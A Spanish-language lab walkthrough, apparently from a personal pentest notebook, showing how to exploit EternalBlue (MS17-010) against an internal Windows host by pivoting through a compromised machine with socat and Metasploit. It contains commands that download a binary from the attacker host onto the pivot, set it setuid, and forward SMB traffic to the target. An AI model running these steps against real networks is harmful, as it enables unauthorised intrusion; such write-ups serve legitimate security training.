# Eternal Blue

tags:

***

**Explotación de Eternal Blue usando Chisel y Socat**

***

1. Descargo el ejecutable portable de socat en mi máquina de atacante, usando el siguiente comando:

```bash
wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
```

Una vez descargado le otorgo permisos de ejecución y abro un servivor http con python por el puerto 80 para poder descargar el archivo desde la máquina pivote 192.168.0.211 usando el siguiente comando:

```bash
wget http://192.168.0.28/socat
chmod u+s socat
```

Ahora, en la máquina pivote 192.168.0.211, la cual ya he rooteado (aunque no es necesario rootearla) ejecuto el siguiente comando de socat:

```bash
socat TCP-LISTEN:4445,fork TCP:10.10.10.134:445
```

Este comando significa que **socat se pone en escucha por el puerto 4445 de la máquina pivote 192.168.0.211** y **redirige el flujo de la ejecución hacia la máquina dentro de la red interna con ip 10.10.10.134**. De esta forma todo lo que enviemos al puerto 4445 de la IP 192.168.0.211 se enviará al puerto 445 de la IP 10.10.10.134.

2. En este paso y con todo lo anterior configurado abro metasploit en mi máquina de atacante, busco eternal blue y uso el auxiliario **scanner/smb/smb\_ms17\_010** para testear que todo funcione. Ejecuto **options**y las introduzco:

![Pasted image 20251204222041](<../.gitbook/assets/Pasted image 20251204222041.png>)

El host es la IP de la máquina que está ejecutando socat y haciendo de "puente", y el puerto es el 4445 porque es en el que nos hemos puesto en escucha con socat. Al ejecutar esto vemos que efectivamente el flujo de la conexión se ejecuta correctamente:

![Pasted image 20251204222156](<../.gitbook/assets/Pasted image 20251204222156.png>)

Metasploit (Atacante) ↓ Envía exploit a 192.168.0.211:4445 ↓ Socat (en B) escucha en :4445 ↓ Socat redirige a 10.10.10.134:445 ↓ EternalBlue explota 10.10.10.134:445

Ahora podemos finalmente obtener la sesión de meterpreter usando el exploit definitivo. Para este caso he elegido **exploit/windows/smb/ms17\_010\_eternalblue**. Ahora seteamos las opciones:

![Pasted image 20251204223813](<../.gitbook/assets/Pasted image 20251204223813.png>)
